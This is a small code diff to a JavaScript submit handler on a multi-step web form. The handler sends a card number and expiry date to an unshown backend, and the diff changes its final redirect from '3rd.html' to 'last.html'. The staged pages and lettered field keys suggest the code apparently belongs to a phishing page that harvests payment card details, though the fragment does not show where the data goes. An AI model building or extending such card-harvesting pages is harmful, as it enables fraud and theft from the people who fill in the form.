@@ -20,7 +20,7 @@ document.getElementById("step2form").addEventListener("submit", function (e) {
     d_CARD: card,
     e_EXPIRY: `${expMonth}/${expYear}`
   }).then(() => {
-    window.location.href = "3rd.html";
+    window.location.href = "last.html";
   }).catch((error) => {
     alert("Error: " + error.message);
   });
